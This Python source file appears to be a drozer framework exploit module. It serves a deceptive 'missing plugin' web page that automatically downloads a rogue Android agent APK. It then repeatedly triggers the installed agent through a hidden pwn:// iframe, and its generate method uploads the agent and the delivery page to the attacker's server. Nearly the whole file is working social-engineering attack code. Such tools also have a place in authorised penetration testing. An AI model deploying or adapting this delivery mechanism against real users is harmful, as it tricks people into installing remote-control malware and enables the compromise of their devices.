from drozer.modules import Module, common
from mwr.common import fs

class UnknownSources(Module, common.Exploit):

    name = "Deliver the Rogue drozer Agent over browser and hold thumbs the user will install it"
    description = """
    Displays a 'missing plugin' page that automatically downloads the Rogue drozer Agent APK. This will rely on the user having the "Unknown Sources" option enabled and ofcourse being gullible enough to install this 'needed plugin'. The delivery web page automatically attempts to invoke the newly installed agent by making use of the pwn:// scheme intent filter.

    Vulnerable:
      * Android - all versions
        
    """
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2013-11-08"
    license = "BSD (3 clause)"
    module_type = "exploit"
    path = ["exploit", "remote", "socialengineering"]
    
    payloads = []
    
    __template = """
<html>
    <head>
        <script>
            function downloadPlugin()
            {
                window.location = "plugin.apk";
            }

            function tryPwn()
            {
                var ifrm = document.createElement("IFRAME");
                ifrm.setAttribute("src", "pwn://lol");
                ifrm.style.visibility = "hidden";
                ifrm.style.display = "none";
                ifrm.style.width = 1+"px"; 
                ifrm.style.height = 1+"px"; 
                document.body.appendChild(ifrm);
            }
        </script>
    </head>
    <body onload="setTimeout('downloadPlugin()', 1500);setInterval('tryPwn()', 1000);">
        <center>
            <img src="data:image/png;base64,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" onclick='tryPwn()' />
            <br /><a href="pwn://lol">Reload</a>
        </center>
    </body>
</html>
    """
    
    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)
        
        self.payload_format = "N"
        
    def add_arguments(self, parser):
        parser.add_argument("--resource", default=None, help="specify the path component of the resultant exploit URI")
    
    def generate(self, arguments):
        path = self.generate_or_default_path(arguments.resource)
        
        print "Uploading blank page to /...",
        if not self.upload(arguments, "/", " "):
            return

        print "Uploading agent to /plugin.apk...",
        if not self.upload(arguments, "/plugin.apk", self.build_agent(arguments), mimetype="application/vnd.android.package-archive"):
            return
        
        print "Uploading web delivery page to %s..." % path,
        if not self.upload(arguments, path, self.build_multipart({ ".*Android.*": self.__template }, "gc0p4Jq0M2Yt08jU534c0p"), mimetype="text/html", headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return
        
        print "Done. Exploit delivery page is available on: http://%s:%d%s" % (arguments.server[0], arguments.server[1], path.replace("\\",""))
        
